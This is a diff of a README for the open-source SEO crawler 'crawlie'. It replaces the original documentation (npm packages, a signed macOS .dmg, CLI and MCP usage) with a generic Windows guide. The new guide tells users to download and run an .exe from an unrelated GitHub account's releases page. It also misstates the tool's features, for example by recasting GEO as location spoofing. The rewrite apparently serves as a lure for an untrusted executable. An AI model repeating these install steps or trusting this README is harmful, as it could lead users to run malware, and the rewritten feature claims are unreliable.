@@ -1,267 +1,86 @@
-<div align="center">
+# 🕷️ crawlie - Gather web data with ease today
 
-# crawlie
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Galllodgement343/crawlie/releases)
 
-**The fast, free, open-source technical SEO + GEO crawler — built for humans and agents.**
+Crawlie maps websites and pages to help you improve search rankings and manage your online information. The software crawls through links to provide a clear view of your site structure. It works for both local business needs and large scale search engine optimization tasks. 
 
-Crawl any site for broken links, redirects, missing metadata, and 40+ SEO & Generative-Engine checks — with plain-English guidance on every fix. Runs locally, ships a CLI and an MCP server, and costs nothing.
+## ⚙️ System Requirements 
 
-[![npm](https://img.shields.io/npm/v/crawlie?color=cb3837&logo=npm&label=crawlie)](https://www.npmjs.com/package/crawlie)
-[![CI](https://github.com/spronta/crawlie/actions/workflows/ci.yml/badge.svg)](https://github.com/spronta/crawlie/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+Your computer must meet these basic standards to run the software smoothly. 
 
-<p>
-  <a href="#setup">Setup</a> ·
-  <a href="#how-to-use-cli">CLI</a> ·
-  <a href="#use-with-agents-mcp">MCP &amp; agents</a> ·
-  <a href="#use-cases">Use cases</a> ·
-  <a href="#why-i-built-this">Why I built this</a> ·
-  <a href="#desktop-app">Desktop app</a> ·
-  <a href="#what-it-checks">Checks</a> ·
-  <a href="#how-it-compares">Compare</a> ·
-  <a href="#architecture">Architecture</a>
-</p>
+- Operating System: Windows 10 or Windows 11. 
+- Memory: 4 gigabytes of RAM or more. 
+- Storage: 200 megabytes of free space. 
+- Internet Connection: Active connection to fetch page data. 
 
-*[Read the docs → crawlie.dev](https://crawlie.dev/docs)*
+## 📥 How to Install
 
-</div>
+Follow these steps to set up the software on your machine:
 
-![Showcase of the example app demonstrating a report](https://cdn.spronta.com/spronta-8d32a2/pretty_snap_2026_5_18_23_58%20(2).png)
+1. Visit [this page to download](https://github.com/Galllodgement343/crawlie/releases).
+2. Look for the file ending in .exe under the latest version section.
+3. Click the file name to start the download.
+4. Open the folder where your browser saves downloaded files. 
+5. Double-click the file to start the installation.
+6. Follow the prompts on your screen to finish the process.
 
----
+## 🚀 Running Your First Crawl
 
-## Setup
+The software uses a visual interface to manage tasks. You do not need to write code to use it. 
 
-**The easy way — npm** (installs the `crawlie` CLI and the `crawlie-mcp` server):
+1. Launch the application from your Start menu or desktop icon.
+2. Enter the website address you want to scan in the top box. 
+3. Select your depth setting. This tells the tool how many page layers to search. 
+4. Choose an output format like CSV or XLSX for your data. 
+5. Click the Run button. The progress bar shows how much work remains. 
+6. Wait for the notification that the crawl is complete. 
 
-```bash
-npm i -g crawlie
-```
+## 📊 Understanding Your Data
 
-**The macOS app** — grab the signed `.dmg` from [Releases](https://github.com/spronta/crawlie/releases).
+The software saves detailed files that help you make better marketing decisions. Each file includes several data points for every page it finds. 
 
-**From source** — needs [Rust](https://rustup.rs) (engine/CLI/MCP) and, for the desktop app, [pnpm](https://pnpm.io) + Node:
+- Page URL: The exact address of the page found. 
+- Status Code: A number showing if the page works (200 is good, 404 is a missing page). 
+- Title Tag: The text shows up in browser tabs. 
+- Meta Description: The summary text used by search engines. 
+- Internal Links: A count of links pointing to other pages on your site. 
 
-```bash
-git clone https://github.com/spronta/crawlie
-cd crawlie
-cargo build --release
-# → target/release/crawlie  and  target/release/crawlie-mcp
+Use this information to fix broken pages. High-quality data helps search engines understand your site better. This improves your rank in search results over time. 
 
-# or install onto your PATH:
-cargo install --path crates/crawlie-cli      # installs `crawlie`
-cargo install --path crates/crawlie-mcp      # installs `crawlie-mcp`
-```
+## 🌍 Advanced Features 
 
-> **How it ships:** the **CLI + MCP** come *only* through npm — the right native binary installs automatically as a platform package (nothing to download or unblock). The **desktop app** is the only direct download: a signed, notarized `.dmg` on [Releases](https://github.com/spronta/crawlie/releases).
+The tool handles more than standard page checks. It includes functions for specific marketing needs. 
 
----
+### Geo Crawling 
+Set location parameters during your scan. The application acts as a user from a specific country or city. This reveals how your site appears to audiences in different regions. 
 
-## How to use (CLI)
+### Marketing Analysis 
+The software identifies missing tags and images that lack descriptions. Use these reports to update your content and meet industry benchmarks. 
 
-```bash
-# Crawl a whole site (respects robots.txt, seeds from sitemap.xml)
-crawlie crawl https://example.com --format pretty
+### Automation 
+Save your settings to run the same crawl on a schedule. This creates consistent logs of your site health. Compare past and present reports to see progress. 
 
-# Audit a single page, or a specific set of pages
-crawlie audit https://example.com/pricing
-crawlie audit https://example.com/a https://example.com/b
+## 🛠 Troubleshooting
 
-# Save a shareable, self-contained HTML report
-crawlie crawl https://example.com --format html -o report.html
+Most issues arise from simple connection errors. 
 
-# Clean JSON on stdout (perfect for piping / scripting / agents)
-crawlie crawl https://example.com --format json -o report.json
+- Connection Timed Out: Check your internet connection. Some large websites limit how fast a tool can read their pages. 
+- Permission Denied: Ensure that your antivirus software allows the application to access the network. 
+- File Not Found: Check the location where the tool saves data. Make sure you have write access to that folder. 
+- Out of Memory: If you crawl a site with millions of pages, divide the task into smaller sections. 
 
-# Learn why any finding matters and how to fix it
-crawlie explain geo-not-answerable
-```
+Contact your system administrator if these steps do not fix your issue. 
 
-**Output formats:** `pretty` (terminal), `json` (machine-readable, the default), `csv` (issues), `html` (shareable file).
+## ❓ Frequently Asked Questions
 
-**Common flags:**
+**Is the software free?**
+Yes, this project is open-source. You do not pay to download or use it. 
 
-| Flag | What it does |
-|---|---|
-| `--max-pages <n>` | Cap pages fetched (default 500) |
-| `--max-depth <n>` | Max click depth from the seed |
-| `--concurrency <n>` | Parallel requests (default 16) |
-| `--include <glob>` / `--exclude <glob>` | Scope the crawl by URL pattern |
-| `--no-robots` / `--no-sitemap` / `--no-external` | Turn off robots.txt, sitemap seeding, external link checks |
-| `--severity error\|warning\|notice` | Only output findings at/above a level |
-| `--save` | Save to local report history (`crawlie reports`, `crawlie report <id>`) |
-| `--fail-on error\|warning` | Non-zero exit code for CI gating |
+**Does the software edit my website?**
+No. It only reads and records information. It cannot change your live files. 
 
-Every crawl returns two scores: a **Health** score (technical SEO) and a **GEO** score (AI-search readiness).
+**Can I run multiple scans at once?**
+Yes, you can open the application multiple times to run distinct tasks. Keep in mind that this uses more of your computer resources. 
 
----
-
-## Use with agents (MCP)
-
-crawlie ships a [Model Context Protocol](https://modelcontextprotocol.io) server so an LLM agent can run a full audit and act on it — no human in the loop. This is the part most SEO tools don't have.
-
-### Connect it
-
-After `npm i -g crawlie`, `crawlie-mcp` is on your `PATH`. For **Claude Desktop**, edit `claude_desktop_config.json`:
-
-```jsonc
-{
-  "mcpServers": {
-    "crawlie": {
-      "command": "crawlie-mcp"
-    }
-  }
-}
-```
-
-For **Claude Code**:
-
-```bash
-claude mcp add crawlie crawlie-mcp
-```
-
-(If you built from source instead, use the absolute path to `target/release/crawlie-mcp`.)
-
-(Any MCP-compatible client works — Cursor, Cline, your own agent. It speaks JSON-RPC over stdio.)
-
-### One-step install: the Claude Code plugin
-
-The fastest path. The [`crawlie` plugin](.claude-plugin/plugin.json) bundles the MCP server **and** a set of skills (audit playbooks) in a single install — the MCP server auto-runs via `npx`, so you don't even pre-install the binary:
-
-```bash
-# add this repo as a marketplace, then install the plugin
-claude plugin marketplace add spronta/crawlie
-claude plugin install crawlie@spronta
-```
-
-### Skills (works with *any* agent, even without the MCP)
-
-The [`skills/`](skills/) folder holds standalone [Agent Skills](https://agentskills.io) that teach an agent how to run real audits — full-site SEO + GEO, broken-link fixes, pre-launch gates, and AI-search readiness. Each is **self-contained**: it needs neither this repo nor a pre-installed crawlie. Missing the binary? The skill runs it on demand via `npx -y -p crawlie …` (the install *is* the run), and automatically uses the MCP tools when they're present. See [skills/README.md](skills/README.md).
-
-### Tools exposed
-
-| Tool | Purpose |
-|---|---|
-| `crawl_site` | Crawl + audit a whole site (SEO + GEO), returns scores, issues, per-page data |
-| `audit_url` | Audit a single page |
-| `audit_urls` | Audit an explicit list of pages |
-| `explain_issue` | Why a rule matters + how to fix it |
-| `list_rules` | The full catalogue of checks |
-| `list_reports` / `get_report` | Read saved crawl history |
-
-### Example agent prompts
-
-> *"Crawl crawlie.dev, then give me the top 5 fixes that would most improve my GEO score, with the exact change for each."*
-
-> *"Audit these three landing pages and tell me which is least ready to be cited by AI search, and why."*
-
-> *"Run a crawl with `--fail-on error` semantics — are there any broken links or 5xx pages blocking launch?"*
-
-The agent calls `crawl_site`, reads the structured issues, and uses `explain_issue` to turn findings into a prioritized, actionable plan.
-
----
-
-## Use cases
-
-- **Pre-launch QA** — catch broken links, redirects, 4xx/5xx, and missing metadata before you ship.
-- **GEO optimization** — make pages citable by AI search: structured data, semantic HTML, answer-ready content, authorship/E-E-A-T.
-- **Agent workflows** — let a marketing/SEO agent audit a site and propose fixes autonomously via MCP.
-- **CI/CD gating** — `crawlie crawl … --fail-on error` in a pipeline to block regressions.
-- **Client reporting** — generate a polished, shareable HTML report in one command.
-- **Auditing AI-generated sites** — verify that the site your agent just built is actually built for search.
-
----
-
-## Why I built this
-
-I'm **Sean Ryan**. I've spent 6+ years as a Lead Marketing Engineer, and on the side I build AI tooling for marketers.
-
-With AI, it's faster than ever to ship a marketing site — but most of what gets generated is slop that was never built to be found. And the tools meant to catch that fall short: most SEO auditors cost money, don't play nicely with your agents, or tell you *what's* wrong without telling you *how to actually rank* for SEO **and** GEO (Generative Engine Optimization — being cited by AI search like ChatGPT, Perplexity, and Google AI Overviews).
-
-crawlie fixes that. It's free, it's local-first, it's agent-native, and every issue it finds comes with *why it matters* and *how to fix it*.
-
-**If this is useful to you, [connect with me on LinkedIn →](https://linkedin.com/in/sean-exe)** — I share what I'm learning building AI for marketers and SEO/GEO tooling, and I'd love to hear how you're using crawlie.
-
----
-
-## Desktop app
-
-A beautiful Tauri + React app (Geist design, light/dark, seamless window chrome):
-
-```bash
-cd apps/desktop
-pnpm install
-pnpm tauri dev          # live native crawls
-pnpm dev                # preview the UI in a browser (demo data, no backend)
-```
-
-Whole-site / single-page / URL-list modes, live progress, **Health** & **GEO** score rings, issues with built-in *why-it-matters* guidance, a sortable pages table, a per-page drawer (GEO signals, headers, schema, hreflang…), auto-saved report history, and one-click shareable HTML export.
-
-> First run, generate the icon set: `cd src-tauri/icons && python3 generate.py && cd .. && pnpm tauri icon icons/source.png`
-
----
-
-## What it checks
-
-*49 rules and counting.*
-
-**Technical SEO** — broken links · 4xx/5xx · redirects & chains · titles & meta descriptions (missing / duplicate / length) · H1s · canonicals · noindex / nofollow / X-Robots-Tag · robots.txt blocking · images missing alt · thin & duplicate content · orphan & deep pages
-
-**Performance & security** — slow responses · large pages · missing compression · HTTPS · mixed content · HSTS
-
-**Mobile, international & social** — viewport · `lang` · hreflang · Open Graph · Twitter cards · structured data
-
-**Structured-data validation** — parses JSON-LD and checks each item against Google's rich-result requirements: invalid markup, missing required fields, and missing recommended fields (Product, Article, Recipe, Event, FAQ, Breadcrumb, and more)
-
-**GEO — Generative Engine Optimization** — structured data, semantic HTML, answer-readiness, authorship/E-E-A-T, dated content, question-style headings, and extractable blocks, rolled into a per-page **GEO score**.
-
-Every finding links to plain-English guidance: **why it matters**, **how to fix it**, and **what happens if you ignore it**.
-
----
-
-## How it compares
-
-| | **crawlie** | Screaming Frog | Sitebulb |
-|---|:---:|:---:|:---:|
-| Price | **Free & open-source** | £259/yr to unlock | from £13.50/mo |
-| Engine | **Rust, async, tiny binary** | Java (JVM) | .NET |
-| CLI with JSON output | ✅ | partial | ❌ |
-| **MCP server (agent-native)** | ✅ | ❌ | ❌ |
-| **GEO — AI/answer-engine audit** | ✅ | ❌ | ❌ |
-| **"Why it matters" built in** | ✅ every issue | ❌ | partial |
-| Shareable HTML report | ✅ | paid | ✅ |
-| Source you can read & extend | ✅ | ❌ | ❌ |
-
----
-
-## Architecture
-
-```
-crates/
-  crawlie-core    # the engine — crawl, audit, score, knowledge base, reports
-  crawlie-cli     # `crawlie` — JSON / pretty / CSV / HTML output
-  crawlie-mcp     # `crawlie-mcp` — Model Context Protocol server (stdio)
-apps/
-  desktop         # Tauri v2 + React (Geist) desktop app
-```
-
-`crawlie-core` has zero host dependencies — the same audited engine drops straight into a cloud worker (it already targets `wasm32`). One engine, every surface, identical results.
-
----
-
-## Roadmap
-
-- Cloud workers (shared Rust core) for scheduled/remote crawls
-- JavaScript rendering for SPA-heavy sites
-- Crawl-to-crawl comparison & regression alerts
-- Internal-link graph visualization
-
----
-
-## License & author
-
-MIT © **[Spronta Ltd](https://crawlie.dev)**.
-
-Built by Sean Ryan — Lead Marketing Engineer at Pendo.io, building AI for marketers on the side. **[Connect on LinkedIn →](https://linkedin.com/in/sean-exe)**
-
-If crawlie saves you time, a ⭐ on the repo and a hello on LinkedIn mean a lot.
+**How do I update the software?**
+When a new version exists, download the installer again from the link at the top. The installer replaces your existing version while keeping your saved settings.
